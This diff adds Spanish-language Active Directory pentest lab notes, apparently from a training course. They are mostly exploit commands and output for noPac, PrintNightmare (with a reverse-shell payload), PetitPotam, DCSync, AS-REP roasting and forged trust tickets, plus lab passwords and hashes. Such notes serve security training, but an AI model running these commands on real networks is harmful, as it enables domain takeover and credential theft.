@@ -873,3 +873,321 @@ NULL
 
 ```
 
+## Exploits
+
+Las más novedosas vulnerabilidades hoy en día se encuentran:
+
+NoPac (SamAccountName Spoofing)
+PrintNightmare (remotely)
+PetitPotam (MS-EFSRPC)
+
+# NoPac
+
+| Command                                                      | Description                                                  |
+| ------------------------------------------------------------ | ------------------------------------------------------------ |
+| `sudo git clone https://github.com/Ridter/noPac.git`         | Used to clone a `noPac` exploit using git. Performed from a Linux-based host. |
+| `sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap` | Runs `scanner.py` to check if a target system is vulnerable to `noPac`/`Sam_The_Admin` from a Linux-based host. |
+| `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap` | Used to exploit the `noPac`/`Sam_The_Admin`  vulnerability and gain a SYSTEM shell (`-shell`). Performed from a Linux-based host. |
+| `sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator` | Used to exploit the `noPac`/`Sam_The_Admin`  vulnerability and perform a `DCSync` attack against the built-in Administrator account on a Domain Controller from a Linux-based host. |
+
+
+
+# PrintNightmare
+
+| Command                                                      | Description                                                  |
+| ------------------------------------------------------------ | ------------------------------------------------------------ |
+| `git clone https://github.com/cube0x0/CVE-2021-1675.git`     | Used to clone a PrintNightmare exploit  using git from a Linux-based host. |
+| `pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install` | Used to ensure the exploit author's (`cube0x0`) version of Impacket is installed. This also uninstalls any previous Impacket version on a Linux-based host. |
+| `rpcdump.py @172.16.5.5 \| egrep 'MS-RPRN\|MS-PAR'`            | Used to check if a Windows target has `MS-PAR` & `MSRPRN` exposed from a Linux-based host. |
+| `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll` | Used to generate a DLL payload to be used by the exploit to gain a shell session. Performed from a Windows-based host. |
+| `sudo smbserver.py -smb2support CompData /path/to/backupscript.dll` | Used to create an SMB server and host a shared folder (`CompData`) at the specified location on the local linux host. This can be used to host the DLL payload that the exploit will attempt to download to the host. Performed from a Linux-based host. |
+| `sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'` | Executes the exploit and specifies the location of the DLL payload. Performed from a Linux-based host. |
+
+
+
+# PetitPotam
+
+| Command                                                      | Description                                                  |
+| ------------------------------------------------------------ | ------------------------------------------------------------ |
+| `sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController` | Impacket tool used to create an `NTLM relay` by specifiying the web enrollment URL for the `Certificate Authority` host. Perfomred from a Linux-based host. |
+| `git clone https://github.com/topotam/PetitPotam.git`        | Used to clone the `PetitPotam` exploit using git. Performed from a Linux-based host. |
+| `python3 PetitPotam.py 172.16.5.225 172.16.5.5`              | Used to execute the PetitPotam exploit by  specifying the IP address of the attack host (`172.16.5.255`) and the target Domain Controller (`172.16.5.5`). Performed from a Linux-based host. |
+| `python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <base64 certificate> = dc01.ccache` | Uses `gettgtpkinit`.py to request a TGT ticket for the Domain Controller (`dc01.ccache`) from a Linux-based host. |
+| `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` | Impacket tool used to perform a DCSync attack and retrieve one or all of the `NTLM password hashes` from the target Windows domain. Performed from a Linux-based host. |
+| `klist`                                                      | `krb5-user` command used to view the contents of the `ccache` file. Performed from a Linux-based host. |
+| `python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$` | Used to submit TGS requests using `getnthash.py` from a Linux-based host. |
+| `secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba` | Impacket tool used to extract hashes from `NTDS.dit` using a `DCSync attack` and a captured hash (`-hashes`). Performed from a Linux-based host. |
+| `.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /<base64 certificate>=/ptt` | Uses Rubeus to request a TGT and perform a `pass-the-ticket attack` using the machine account (`/user:ACADEMY-EA-DC01$`) of a Windows target. Performed from a Windows-based host. |
+| `mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt`      | Performs a DCSync attack using `Mimikatz`. Performed from a Windows-based host. |
+
+## Misconfiguration
+
+Hay veces donde una mala configuración de la máquina Windows puede llevarnos a movernos lateralmente o escalar privilegios, por ejemplo para enumerar podemos usar una herramienta como adidnsdump 
+para enumerar todos los registros DNS en un dominio usando una cuenta de usuario de dominio válida.
+
+```shell
+$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 
+
+Password: 
+
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[-] Querying zone for records
+[+] Found 27 records
+
+$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
+
+Password: 
+
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[-] Querying zone for records
+[+] Found 27 records
+```
+
+### Campo de Descripción
+
+Hay veces donde en el campo de descripción de los usuarios, nos encontramos con contraseñas o datos sensibles
+
+```powershell
+PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
+
+samaccountname description
+-------------- -----------
+administrator  Built-in account for administering the computer/domain
+guest          Built-in account for guest access to the computer/domain
+krbtgt         Key Distribution Center Service Account
+ldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!
+```
+### PASSWD-NOREQ
+
+Cuando este campo está habilitado, el usuario cuenta con una contraseña muy débil o no tiene contraseña, para enumerar estos usuarios podemos usar:
+
+```powershell
+PS C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
+
+samaccountname                                                         useraccountcontrol
+--------------                                                         ------------------
+guest                ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+mlowe                                PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+ehamilton                            PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+$725000-9jb50uejje9f                       ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
+nagiosagent                                                PASSWD_NOTREQD, NORMAL_ACCOUNT
+```
+### SMB Shares y SYSVOL Scripts
+
+En el directorio SYSVOL podemos encontrar varios scripts con información valiosa para nuestro ataque.
+
+```powershell
+PS C:\htb> cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
+
+On Error Resume Next
+strComputer = "."
+ 
+Set oShell = CreateObject("WScript.Shell") 
+sUser = "Administrator"
+sPwd = "!ILFREIGHT_L0cALADmin!"
+ 
+Set Arg = WScript.Arguments
+If  Arg.Count > 0 Then
+sPwd = Arg(0) 'Pass the password as parameter to the script
+End if
+ 
+'Get the administrator name
+Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+
+<SNIP>
+```
+
+### GPP
+
+Preferencias de directiva de grupo (GPP) es una poderosa extensión de políticas de grupo de Windows que facilita la configuración y administración del parque de computadoras y es una especie de 
+sustitución de diferentes scripts en GPO. Cuando se crea un nuevo GPP, se crea un archivo .xml en el recurso compartido SYSVOL, que también se almacena en caché localmente en los puntos finales a los 
+que se aplica la Política de grupo.
+
+Estos archivos pueden contener una matriz de datos de configuración y contraseñas definidas. El cpasswordvalor del atributo está cifrado con AES de 256 bits, pero Microsoft publicó la clave privada 
+AES en MSDN , que se puede usar para descifrar la contraseña. Podemos usar varias herramientas para conseguir estas contraseñas.
+
+```shell
+$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
+
+Password1
+```
+```shell
+$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
+
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found SYSVOL share
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Searching for Registry.xml
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Found INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found credentials in INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']
+GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']
+```
+
+### AS-REProast attack
+
+Cuando un usuario tiene activado el `DONT_REQ_PREAUTH` podemos obtener un TGT (Ticket Granting Ticket) para que posterior podamos intentarla crackearla.
+
+```powershell
+PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+
+samaccountname     : mmorgan
+userprincipalname  : mmorgan@inlanefreight.local
+useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
+```
+Podemos usar `Rubeus` para obtener ese hash o directamente en linux con `kerbrute` o `GETNPUser.py`
+
+```powershell
+PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+[*] Action: AS-REP roasting
+
+[*] Target User            : mmorgan
+[*] Target Domain          : INLANEFREIGHT.LOCAL
+
+[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=mmorgan))'
+[*] SamAccountName         : mmorgan
+[*] DistinguishedName      : CN=Matthew Morgan,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+[*] Using domain controller: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL (172.16.5.5)
+[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\mmorgan'
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+     $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:D18650F4F4E0537E0188A6897A478C55$097882
+```
+
+Cuando tenemos manera de obtener el hash o contraseña del usuario krbtgt podemos hacer `Attack Domain Trusts Child -> Parent` para eso necesitamos lo siguiente
+
+The KRBTGT hash for the child domain
+The SID for the child domain
+The name of a target user in the child domain (does not need to exist!)
+The FQDN of the child domain
+The SID of the Enterprise Admins group of the root domain
+
+```shell
+secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
+Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
+[*] Kerberos keys grabbed
+krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
+krbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e
+krbtgt:des-cbc-md5:fee04c3d026d7538
+[*] Cleaning up... 
+```
+```shell
+$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
+
+Password:
+
+[*] Domain SID is: S-1-5-21-2806153819-209893948-92287268
+```
+```shell
+lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
+
+Password:
+[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
+498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: INLANEFREIGHT\administrator (SidTypeUser)
+```
+Y creamos el ticket
+
+```shell
+ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
+
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for LOGISTICS.INLANEFREIGHT.LOCAL/hacker
+[*] 	PAC_LOGON_INFO
+[*] 	PAC_CLIENT_INFO_TYPE
+[*] 	EncTicketPart
+```
+Hay una herramienta que te automatiza todo esto
+
+```shell
+raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
+
+Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation
+
+Password:
+[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL
+[*] Forest FQDN is: INLANEFREIGHT.LOCAL
+[*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL
+[*] INLANEFREIGHT.LOCAL Enterprise Admin SID is: S-1-5-21-3842939050-3880317879-2865463114-519
+[*] Getting credentials for LOGISTICS.INLANEFREIGHT.LOCAL
+LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
+LOGISTICS.INLANEFREIGHT.LOCAL/krbtgt:aes256-cts-hmac-sha1-96s:d9
+```
+Hay muchas herramientas de las cuales podemos hacer reconocimiento rapidamente en un entorno de directorio activo, alguna de estas pueden ser:
+
+
+### Ping Caste
+
+```powershell
+C:\htb> PingCastle.exe --help
+
+switch:
+  --help              : display this message
+  --interactive       : force the interactive mode
+  --log               : generate a log file
+  --log-console       : add log to the console
+  --log-samba <option>: enable samba login (example: 10)
+
+Common options when connecting to the AD
+  --server <server>   : use this server (default: current domain controller)
+                        the special value * or *.forest do the healthcheck for all domains
+  --port <port>       : the port to use for ADWS or LDAP (default: 9389 or 389)
+  --user <user>       : use this user (default: integrated authentication)
+  --password <pass>   : use this password (default: asked on a secure prompt)
+  --protocol <proto>  : selection the protocol to use among LDAP or ADWS (fastest)
+                      : ADWSThenLDAP (default), ADWSOnly, LDAPOnly, LDAPThenADWS
+
+<SNIP>  
+```
+
+### Group3r
+
+```cmd
+C:\htb> group3r.exe -f <filepath-name.log> 
+```
+
+### ADRecon
+
+```powershell
+PS C:\htb> .\ADRecon.ps1
+
+[*] ADRecon v1.1 by Prashant Mahajan (@prashant3535)
+[*] Running on INLANEFREIGHT.LOCAL\MS01 - Member Server
+[*] Commencing - 03/28/2022 09:24:58
+[-] Domain
+[-] Forest
+[-] Trusts
+[-] Sites
+[-] Subnets
+[-] SchemaHistory - May take some time
+[-] Default Password Policy
+[-] Fine Grained Password Policy - May need a Privileged Account
+[-] Domain Controllers
+[-] Users and SPNs - May take some time
+[-] PasswordAttributes - Experimental
+[-] Groups and Membership Changes - May take some time
+[-] Group Memberships - May take some time
+[-] OrganizationalUnits (OUs)
+```
